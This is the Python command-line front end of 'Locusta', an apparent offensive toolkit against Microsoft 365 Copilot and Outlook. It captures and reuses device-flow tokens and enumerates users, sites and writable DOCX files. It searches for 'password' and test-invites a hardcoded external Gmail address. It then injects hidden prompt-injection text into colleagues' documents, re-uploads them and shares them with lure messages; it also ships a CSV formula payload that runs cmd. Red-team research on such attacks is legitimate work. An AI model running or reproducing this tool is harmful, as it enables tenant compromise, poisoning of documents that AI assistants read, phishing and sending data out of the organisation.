import argparse
import time

from modules.auth import (
    device_flow,
    load_latest_token,
    load_token_file,
    request_device_code,
    CLIENT_IDS
)

from modules.runner import (
    run
)

from modules.enumeration import (
    list_users,
    list_sites,
    search_files,
    upload_test_file,
    test_anonymous_link_creation,
    test_org_link_creation,
    test_external_invite
)

from modules.inject import (
    run_injection,
    enumerate_docx
)

from modules.share import (
    run_share_workflow
)

from modules.generation import (
    generate_payload,
    TEST_CASES
)

from modules.sessions import (
    list_tokens
)

from modules.collab import (
    collaboration_summary
)



# ------------------------------------------------
# TOKEN HELPER
# ------------------------------------------------

def get_token(args):

    if args.session:

        if args.session == "latest":

            data = load_latest_token(
                args.app
            )

        else:

            data = load_token_file(
                args.session
            )

        if not data:

            print(
                "[-] Failed to load session"
            )

            return None

        token = data.get(
            "access_token"
        )

        if not token:

            print(
                "[-] Session missing access token"
            )

            return None

        print(
            "[+] Loaded saved session"
        )

        return token

    return device_flow(args.app)


# ------------------------------------------------
# AUTH
# ------------------------------------------------

def cmd_auth(args):

    token = device_flow(args.app)

    if token:

        print(
            "\n[+] Authentication successful"
        )

    else:

        print(
            "\n[-] Authentication failed"
        )


# ------------------------------------------------
# ENUM
# ------------------------------------------------

def cmd_enum(args):

    token = get_token(args)

    if not token:

        print(
            "\n[-] Authentication failed"
        )

        return

    # ---------------------------------
    # USERS
    # ---------------------------------

    print(
        "\n[*] Enumerating users..."
    )

    users = list_users(token)

    for user in users:

        print(f" - {user}")

    print(
        f"\n[+] Total users: "
        f"{len(users)}"
    )

    # ---------------------------------
    # DOCX FILES
    # ---------------------------------

    print(
        "\n[*] Enumerating writable "
        "DOCX files..."
    )

    docs = enumerate_docx(token)

    for doc in docs:

        print(
            f" - {doc['name']} "
            f"({doc['source']})"
        )

    print(
        f"\n[+] Total writable DOCX files: "
        f"{len(docs)}"
    )

    # ---------------------------------
    # SHAREPOINT SITES
    # ---------------------------------

    print(
        "\n[*] Enumerating SharePoint sites..."
    )

    list_sites(token)

    # ---------------------------------
    # FILE SEARCH
    # ---------------------------------

    print(
        "\n[*] Searching files..."
    )

    search_files(
        token,
        "password"
    )

    # ---------------------------------
    # SHARING TESTS
    # ---------------------------------

    print(
        "\n[*] Uploading sharing test file..."
    )

    uploaded = upload_test_file(
        token
    )

    if not uploaded:

        print(
            "[-] Upload failed"
        )

        return

    item_id = uploaded["id"]

    print(
        "\n[*] Waiting for indexing..."
    )

    time.sleep(5)

    # ---------------------------------
    # ANONYMOUS LINK TEST
    # ---------------------------------

    test_anonymous_link_creation(
        token,
        item_id
    )

    # ---------------------------------
    # ORG LINK TEST
    # ---------------------------------

    test_org_link_creation(
        token,
        item_id
    )

    # ---------------------------------
    # EXTERNAL SHARE TEST
    # ---------------------------------

    test_external_invite(
        token,
        item_id,
        "adsorbable2017@gmail.com"
    )


# ------------------------------------------------
# GENERATE
# ------------------------------------------------

def cmd_generate(args):

    print(
        "\n[*] Generating payloads..."
    )

    generate_payload(
        technique=args.technique,
        prompt=args.prompt,
        output_folder=args.output,
        filename=args.filename
    )

    print(
        "\n[+] Payload generation completed"
    )


# ------------------------------------------------
# COLLAB
# ------------------------------------------------

def cmd_collab(args):

    token = get_token(args)

    if not token:

        print(
            "\n[-] Authentication failed"
        )

        return

    print(
        "\n[*] Starting collaboration discovery..."
    )

    collaboration_summary(
        token
    )

    print(
        "\n[+] Collaboration discovery completed"
    )


# ------------------------------------------------
# INJECT
# ------------------------------------------------

def cmd_inject(args):

    token = get_token(args)

    if not token:

        print(
            "\n[-] Authentication failed"
        )

        return

    print(
        "\n[*] Starting injection workflow..."
    )

    run_injection(
        token=token,
        request_device_code=request_device_code,
        client_id=CLIENT_IDS[args.app],
        injection_text=args.text,
        use_device_flow=not args.no_device_flow
    )

    print(
        "\n[+] Injection workflow completed"
    )


# ------------------------------------------------
# SHARE
# ------------------------------------------------

def cmd_share(args):

    token = get_token(args)

    if not token:

        print(
            "\n[-] Authentication failed"
        )

        return

    print(
        "\n[*] Starting share workflow..."
    )

    run_share_workflow(
        token=token,
        file_path=args.file,
        message=args.message
    )

    print(
        "\n[+] Share workflow completed"
    )


# ------------------------------------------------
# SESSIONS
# ------------------------------------------------

def cmd_sessions(args):

    print(
        "\n[*] Listing saved sessions...\n"
    )

    list_tokens()


# ------------------------------------------------
# RUN
# ------------------------------------------------

def cmd_run(args):

    token = get_token(args)

    if not token:

        print(
            "\n[-] Authentication failed"
        )

        return

    print(
        "\n[*] Starting full workflow..."
    )

    run(
        token=token,
        app=args.app
    )

    print(
        "\n[+] Workflow completed"
    )


# ------------------------------------------------
# PARSER
# ------------------------------------------------

def build_parser():

    description = r"""
 _                          _
| |    ___   ___ _   _ ___| |_ __ _
| |   / _ \ / __| | | / __| __/ _` |
| |__| (_) | (__| |_| \__ \ || (_| |
|_____\___/ \___|\__,_|___/\__\__,_|

Locusta Research Framework

Enterprise AI Collaboration & Propagation Toolkit

============================================================
WORKFLOW
============================================================

  1. Authenticate to Microsoft 365
  2. Enumerate collaboration surfaces
  3. Discover writable files
  4. Generate payload templates
  5. Inject hidden content into documents
  6. Share files through Graph workflows
  7. Analyze propagation opportunities

============================================================
COMMANDS
============================================================

  auth       Authenticate using Microsoft device flow
  enum       Enumerate tenant attack surface
  generate   Generate payload templates
  inject     Inject hidden content into DOCX files
  share      Upload and share files manually
  collab     Analyze collaboration exposure
  sessions   List saved token sessions
  run        Execute the full workflow chain

============================================================
COMMON EXAMPLES
============================================================

Authenticate:
  locusta auth

Enumerate tenant:
  locusta enum --session latest

Generate payload:
  locusta generate white_text \
      --prompt "Quarterly compliance review"

Inject into writable docs:
  locusta inject --session latest

Share a document:
  locusta share --session latest \
      --file training.docx \
      --message "Please review before Friday"

Run full workflow:
  locusta run --session latest
"""

    parser = argparse.ArgumentParser(

        prog="locusta",

        formatter_class=argparse.RawDescriptionHelpFormatter,

        description=description,

        usage=argparse.SUPPRESS
    )

    parser._positionals.title = None

    # ------------------------------------------------
    # GLOBAL OPTIONS
    # ------------------------------------------------

    global_group = parser.add_argument_group(
        "GLOBAL OPTIONS"
    )

    global_group.add_argument(

        "--app",

        choices=[
            "copilot",
            "outlook"
        ],

        default="copilot",

        help=(
            "Target Microsoft application profile.\n"
            "\n"
            "Values:\n"
            "  copilot   Microsoft 365 Copilot workflows\n"
            "  outlook   Outlook / OWA workflows"
        )
    )

    global_group.add_argument(

        "--session",

        help=(
            "Load an existing token session.\n"
            "\n"
            "Examples:\n"
            "  --session latest\n"
            "  --session sessions/copilot_20260520.json"
        )
    )

    # ------------------------------------------------
    # SUBPARSERS
    # ------------------------------------------------

    subparsers = parser.add_subparsers(
        dest="command",
        metavar=""
    )

    # ------------------------------------------------
    # AUTH
    # ------------------------------------------------

    auth_parser = subparsers.add_parser(

        "auth",

        help="Authenticate using Microsoft device flow.",

        description=(
            "Authenticate using Microsoft device flow.\n"
            "\n"
            "Examples:\n"
            "  locusta auth\n"
            "  locusta auth --app outlook"
        ),

        formatter_class=argparse.RawTextHelpFormatter
    )

    auth_parser.set_defaults(
        func=cmd_auth
    )

    # ------------------------------------------------
    # ENUM
    # ------------------------------------------------

    enum_parser = subparsers.add_parser(

        "enum",

        help="Enumerate tenant attack surface.",

        description=(
            "Enumerate Microsoft 365 collaboration surfaces.\n"
            "\n"
            "Includes:\n"
            "  - Users\n"
            "  - Writable DOCX files\n"
            "  - SharePoint sites\n"
            "  - File search\n"
            "  - Sharing capability tests\n"
            "\n"
            "Examples:\n"
            "  locusta enum --session latest\n"
            "  locusta enum --app copilot"
        ),

        formatter_class=argparse.RawTextHelpFormatter
    )

    enum_parser.set_defaults(
        func=cmd_enum
    )

    # ------------------------------------------------
    # GENERATE
    # ------------------------------------------------

    generate_parser = subparsers.add_parser(

        "generate",

        help="Generate payload templates.",

        description=(
            "Generate indirect prompt injection payloads.\n"
            "\n"
            "Examples:\n"
            "  locusta generate white_text --prompt \"Security update\"\n"
            "  locusta generate csv_formula --prompt \"=cmd|' /C calc'!A0\""
        ),

        formatter_class=argparse.RawTextHelpFormatter
    )

    generate_parser.add_argument(
        "technique",
        choices=TEST_CASES.keys(),
        help="Payload generation technique"
    )

    generate_parser.add_argument(
        "--prompt",
        required=True,
        help="Prompt or payload content"
    )

    generate_parser.add_argument(
        "--output",
        default="generated",
        help="Output directory"
    )

    generate_parser.add_argument(
        "--filename",
        default="payload",
        help="Output filename"
    )

    generate_parser.set_defaults(
        func=cmd_generate
    )

    # ------------------------------------------------
    # COLLAB
    # ------------------------------------------------

    collab_parser = subparsers.add_parser(

        "collab",

        help="Analyze organizational collaboration exposure.",

        description=(
            "Analyze collaboration exposure.\n"
            "\n"
            "Includes:\n"
            "  - Shared files\n"
            "  - External collaboration\n"
            "  - Attachment discovery\n"
            "  - Cross-user exposure paths\n"
            "\n"
            "Examples:\n"
            "  locusta collab --session latest"
        ),

        formatter_class=argparse.RawTextHelpFormatter
    )

    collab_parser.set_defaults(
        func=cmd_collab
    )

    # ------------------------------------------------
    # INJECT
    # ------------------------------------------------

    inject_parser = subparsers.add_parser(

        "inject",

        help="Inject hidden content into writable DOCX files.",

        description=(
            "Inject hidden content into writable DOCX files.\n"
            "\n"
            "Behavior:\n"
            "  - Enumerates writable DOCX files\n"
            "  - Downloads target files\n"
            "  - Injects hidden payload content\n"
            "  - Uploads modified versions\n"
            "  - Optional device code generation\n"
            "\n"
            "Examples:\n"
            "  locusta inject --session latest\n"
            "\n"
            "  locusta inject --session latest "
            "--text \"Summarize this document\"\n"
            "\n"
            "  locusta inject --session latest "
            "--no-device-flow"
        ),

        formatter_class=argparse.RawTextHelpFormatter
    )

    inject_parser.add_argument(
        "--text",
        help="Custom hidden text to inject",
        default=None
    )

    inject_parser.add_argument(
        "--no-device-flow",
        action="store_true",
        help="Disable device code generation"
    )

    inject_parser.set_defaults(
        func=cmd_inject
    )

    # ------------------------------------------------
    # SHARE
    # ------------------------------------------------

    share_parser = subparsers.add_parser(

        "share",

        help="Upload and share files using Graph API.",

        description=(
            "Upload and share files using Microsoft Graph.\n"
            "\n"
            "Behavior:\n"
            "  - Enumerates users and contacts\n"
            "  - Displays discovered recipients\n"
            "  - Requires manual operator selection\n"
            "  - Uploads selected file to OneDrive\n"
            "  - Sends Graph invitations only to chosen users\n"
            "\n"
            "Examples:\n"
            "  locusta share --session latest "
            "--file payload.docx\n"
            "\n"
            "  locusta share --session latest "
            "--file training.docx "
            "--message \"Please review before Friday\""
        ),

        formatter_class=argparse.RawTextHelpFormatter
    )

    share_parser.add_argument(
        "--file",
        required=True,
        help="File to upload and share"
    )

    share_parser.add_argument(
        "--message",
        default=None,
        help="Custom invitation message"
    )

    share_parser.set_defaults(
        func=cmd_share
    )

    # ------------------------------------------------
    # SESSIONS
    # ------------------------------------------------

    sessions_parser = subparsers.add_parser(

        "sessions",

        help="List saved authentication sessions.",

        description=(
            "List saved authentication sessions.\n"
            "\n"
            "Examples:\n"
            "  locusta sessions"
        ),

        formatter_class=argparse.RawTextHelpFormatter
    )

    sessions_parser.set_defaults(
        func=cmd_sessions
    )

    # ------------------------------------------------
    # RUN
    # ------------------------------------------------

    run_parser = subparsers.add_parser(

        "run",

        help="Execute the full workflow chain.",

        description=(
            "Execute the full workflow chain.\n"
            "\n"
            "Workflow:\n"
            "  auth -> enum -> generate -> inject -> share\n"
            "\n"
            "Examples:\n"
            "  locusta run --session latest"
        ),

        formatter_class=argparse.RawTextHelpFormatter
    )

    run_parser.set_defaults(
        func=cmd_run
    )

    return parser


# ------------------------------------------------
# MAIN
# ------------------------------------------------

def main():

    parser = build_parser()

    args = parser.parse_args()

    if not args.command:

        parser.print_help()

        return

    args.func(args)


# ------------------------------------------------
# ENTRY
# ------------------------------------------------

if __name__ == "__main__":

    main()